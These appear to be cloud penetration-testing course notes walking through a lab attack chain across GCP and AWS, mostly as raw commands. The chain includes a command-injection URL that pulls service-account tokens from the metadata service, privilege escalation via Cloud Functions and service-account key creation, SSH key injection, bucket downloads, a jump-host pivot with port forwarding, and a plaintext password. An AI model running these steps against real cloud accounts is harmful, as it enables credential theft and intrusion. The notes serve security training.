<img width="815" alt="image" src="https://github.com/securegns/notes/assets/24625106/e6343c1a-6fd2-49e0-b9e4-c4b371ebceed"># Course notes
A cloud could also have ...
- One account which can manage multiple accounts (ex. AWS orginisations)
- Cross account access (ex. Azure guest users)
- In GCP by default role attached to compute instance, in AWS/Azure its not enabled by default

### Apps URLs
AWS  -  orgname.awsapps.com/start
Microsoft - https://myapps.microsoft.com/

### Important URLs
MS admin portal - https://portal.microsoft.com/Adminportal/Home
GCP identity - admin.google.com
GCP user - myaccount.google.com

SAML, OpenIDConnect, O-Auth

Policies
- Inline policy
- Managed Policy - Managed policies, Customer Managed policies

Pentesting methodology
- MITRE ATT&CK Cloud matrix
- Cyberwarefarelabs - redteam attack flow

#### Resource hirarchy
- AWS - https://cdn.ttgtmedia.com/rms/onlineimages/aws_resource_hierarchy-f_mobile.png
- Azure - https://learn.microsoft.com/en-us/azure/cloud-adoption-framework/ready/azure-setup-guide/media/organize-resources/scope-levels.png
- GCP - https://cloud.google.com/static/resource-manager/img/cloud-hierarchy.svg 

#### Tools
- ```cloud_enum.py``` - bruteforce names against multi-cloud DNS bruteforce for services
- PACU for AWS

### Metadata
- ```curl http://169.254.169.254``` - All cloud providers have same IP to check if it is a cloud instance
- ```curl http://169.254.169.254/metadata```
 
# Commands
Login to gcp cli
```gcloud auth activate-service-account --key-file auth.json```

gcloud login with access-token ```gcloud projects list --access-token-file accesstoken.txt```

## All commands

gcloud auth activate-service-account --key-file ./sonic-airfoil-339910-8c4c6de6bf0d.json 

gcloud projects get-iam-policy sonic-airfoil-339910 --flatten="bindings[].members" --filter="bindings.members=serviceaccount:ssa-service-account@sonic-airfoil-339910.iam.gserviceaccount.com" --format="value(bindings.role)" - Output we get role name, use that for next command

gcloud iam roles describe 684bk057 --project sonic-airfoil-339910

gcloud container clusters list --format json

gcloud container clusters list

gcloud compute forwarding-rules list - we get an IP

URLs
- http://34.132.232.167/?cmd=curl%20http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email%20-H%20%22Metadata-Flavor:Google%22
- http://34.132.232.167/?cmd=curl%20http://169.254.169.254/computeMetadata/v1/instance/service-accounts/gke-service-account@sonic-airfoil-339910.iam.gserviceaccount.com/token%20-H%20%22Metadata-Flavor:Google%22
- https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=[TOKEN]

gcloud compute instances list

gcloud compute instances get-iam-policy tesing-instance --zone us-central1-b --flatten="bindings[].members" --filter="bindings.members=serviceaccount:gke-service-account@sonic-airfoil-339910.iam.gserviceaccount.com" --format="value(bindings.role)"

gcloud iam roles describe ew606s6o --project sonic-airfoil-339910

ssh-keygen , gcp.pub created, add gcp:... to the file which because we want gcp is username

gcloud compute instances add-metadata tesing-instance --metadata-from-file ssh-keys=gcp.pub --zone us-central1-b --access-token-file sess.txt

gcloud compute instances describe tesing-instance - get the ip of vm

ssh -i ./gcp gcp@104.154.17.222
- get the name of service account attached to that VM - gcloud auth list
- gcloud auth print-access-token

gcloud projects get-iam-policy sonic-airfoil-339910 --flatten="bindings[].members" --filter="bindings.members=serviceaccount:dsa-service-account@sonic-airfoil-339910.iam.gserviceaccount.com" --format="value(bindings.role)"

gcloud iam service-accounts list

(using auth token of SSH VM's account) - gcloud functions deploy privesc-fun --timeout 539 --trigger-http --allow-unauthenticated --source function-source --runtime python37 --entry-point hello_world --service-account msa-service-account@sonic-airfoil-339910.iam.gserviceaccount.com --access-token-file ./testing-instance.txt

(Not working) - gcloud functions deploy privesc-fun --timeout 539 --trigger-http --allow-unauthenticated --source function-source --runtime python37 --entry-point hello_world --service-account msa-service-account@sonic-airfoil-339910.iam.gserviceaccount.com --access-token-file ./vm-token.txt

- https://us-central1-sonic-airfoil-339910.cloudfunctions.net/privesc-fun

gcloud iam service-accounts get-iam-policy cpsa-service-account@sonic-airfoil-339910.iam.gserviceaccount.com

gcloud iam roles describe hivb3dzc --project sonic-airfoil-339910

gcloud iam service-accounts keys create cpsa-key.json --iam-account=cpsa-service-account@sonic-airfoil-339910.iam.gserviceaccount.com --access-token-file function_sess.txt 

gcloud auth activate-service-account --key-file cpsa-key.json

gcloud projects list

gcloud projects get-iam-policy project-staging-344908 --flatten="bindings[].members" --format="table(bindings.role)" --filter="bindings.members:cpsa-service-account@sonic-airfoil-339910"

gcloud config set project project-staging-344908

gcloud compute instances list

gcloud compute instances describe staging-instance

gcloud compute firewall-rules list

gcloud compute firewall-rules describe fw-allow-private-staging-vpc

ssh-keygen - vm-oslogin - do this in Mac

gcloud compute os-login ssh-keys add --key-file=vm-oslogin.pub - we get login profile name use it as username - do this in mac

Copy the vm-oslogin file(not the .pub file) to testing-instance and do chmod 0600 vm-oslogin

ssh -i vm-oslogin sa_106304274774497555045@34.170.123.186 - from inside testing-instance

(now we are inside staging instance) get access token of SPN of that staging - gcloud auth print-access-token

gcloud storage ls --access-token-file vm-staging-token.txt
gcloud storage ls gs://staging-storage-metatech/ --access-token-file vm-staging-token.txt

Download files = gcloud storage cp gs://staging-storage-metatech/roadmaps . --access-token-file staging.txt

gcloud compute instances describe staging-instance - Now copy the private key file from output the .ppk file

 --- AWS ---
puttygen aws_ec2.ppk -O private-openssh -o ssh-jump-host.pem

ssh -i ssh-jump-host.pem ec2-user@18.118.189.176

(after login)

aws sts get-caller-identity

aws iam list-attached-role-policies --role-name jumphost-iam-access-role

aws iam list-role-policies --role-name jumphost-iam-access-role

aws iam get-role-policy --policy-name iam_policy --role-name jumphost-iam-access-role

metadata - curl http://169.254.169.254/latest/user-data/

nc -nv 10.20.1.220 80 - from inside ec2 we can see git lab is open

sudo ssh -L 127.0.0.1:80:10.20.1.220:80 -i ./ssh-jump-host.pem ec2-user@18.118.189.176 - port forward to access gitlab

gns, Password@123 - gitlab password

